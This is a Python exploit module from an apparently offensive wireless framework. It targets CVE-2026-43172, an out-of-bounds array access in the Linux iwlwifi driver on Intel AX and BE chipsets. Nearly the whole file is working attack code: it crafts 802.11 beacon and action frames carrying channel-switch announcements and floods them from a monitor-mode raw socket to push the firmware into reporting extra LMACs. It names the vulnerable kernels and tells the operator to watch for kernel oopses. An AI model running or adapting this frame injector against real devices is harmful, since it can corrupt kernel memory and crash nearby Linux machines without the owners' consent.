# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Intel iwlwifi Out-of-Bounds Array Access via Firmware LMACs (CVE-2026-43172).

    The iwlwifi MVM driver in the Linux kernel does not properly validate
    the number of LMACs reported by Intel WiFi firmware.  When the firmware
    reports 3 or more LMACs, the driver accesses beyond the bounds of a
    statically-sized array, corrupting adjacent kernel memory.  An attacker
    can trigger this by sending crafted management frames that cause the
    firmware to enter a state where it reports extra LMAC instances during
    channel switch or scan operations.

    Fixed in Linux 6.18.16+, 6.19.6+.

    CVSS v3.1: ~7.5 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intel iwlwifi LMAC Out-of-Bounds Access (CVE-2026-43172)",
        "description": (
            "Exploits CVE-2026-43172 via an out-of-bounds array access in "
            "the iwlwifi MVM driver.  The driver trusts the firmware's "
            "reported LMAC count without bounds checking.  Crafted 802.11 "
            "management frames (CSA, extended channel switch) force the "
            "firmware into reporting extra LMAC instances, causing the "
            "driver to access memory beyond the array limits."
        ),
        "authors": (
            "Linux kernel security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-43172",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-04-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel before 6.18.16 / 6.19.6 with iwlwifi",
            "Intel AX200, AX201, AX210, AX211, BE200 chipsets",
            "Ubuntu, Fedora, Arch with vulnerable iwlwifi",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    channel = OptInteger(36, "Current WiFi channel")
    target_channel = OptInteger(149, "Channel to switch to via CSA")
    csa_count = OptInteger(64, "Number of CSA beacon injection rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_ACTION = 0x0D
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3
    _IE_CSA = 37
    _IE_EXTENDED_CSA = 60

    _ACTION_CATEGORY_SPECTRUM = 0
    _ACTION_CSA_ANNOUNCE = 4

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_csa_ie(self, new_channel: int, count: int = 3) -> bytes:
        data = struct.pack("BBB", 1, new_channel & 0xFF, count & 0xFF)
        return struct.pack("BB", self._IE_CSA, len(data)) + data

    def _build_extended_csa_ie(self, new_channel: int, count: int = 3) -> bytes:
        data = struct.pack("BBBB", 1, 1, new_channel & 0xFF, count & 0xFF)
        return struct.pack("BB", self._IE_EXTENDED_CSA, len(data)) + data

    def _build_csa_beacon(self, src_bssid: bytes, iteration: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", (iteration & 0x0FFF) << 4)
        header = fc + duration + dst + src_bssid + src_bssid + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = struct.pack("BB", self._IE_SSID, 8) + b"iwl-fuzz"
        rates_ie = struct.pack("BB", self._IE_SUPPORTED_RATES, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        ds_ie = struct.pack("BB", self._IE_DS_PARAMETER, 1) + struct.pack("B", self.channel)

        csa_ie = self._build_csa_ie(self.target_channel, 3)
        ext_csa_ie = self._build_extended_csa_ie(self.target_channel, 3)

        body = fixed + ssid_ie + rates_ie + ds_ie + csa_ie + ext_csa_ie
        return header + body

    def _build_csa_action_frame(self, src_bssid: bytes) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_ACTION)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src_bssid + src_bssid + seq_ctrl

        category = struct.pack("B", self._ACTION_CATEGORY_SPECTRUM)
        action = struct.pack("B", self._ACTION_CSA_ANNOUNCE)
        csa_ie = self._build_csa_ie(self.target_channel, 1)

        body = category + action + csa_ie
        return header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        src = b"\xaa\xbb\xcc\xdd\xee\xff"
        bssid = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        return header + ssid_ie + rates_ie

    def _inject_frame(self, sock: socket.socket, frame: bytes) -> bool:
        try:
            sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting CSA beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src_bssid = b"\x02\x00\x00\x00\x00\x01"

        print_status(
            f"Injecting {self.csa_count} CSA beacon rounds "
            f"(channel {self.channel} -> {self.target_channel})"
        )

        success = 0
        for rnd in range(self.csa_count):
            src = bytearray(src_bssid)
            src[5] = rnd & 0xFF

            beacon = self._build_csa_beacon(bytes(src), rnd)
            action = self._build_csa_action_frame(bytes(src))

            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.002)
            if self._inject_frame(raw, action):
                success += 1
            time.sleep(0.002)

        raw.close()

        print_status(f"Injected {success} frames across {self.csa_count} rounds")
        print_info(
            "If the target runs iwlwifi on a kernel before 6.18.16 / 6.19.6, "
            "repeated CSA announcements should force firmware LMAC re-init. "
            "When the firmware reports 3+ LMACs, the driver accesses beyond "
            "the array bounds. Monitor for kernel warnings or oops."
        )
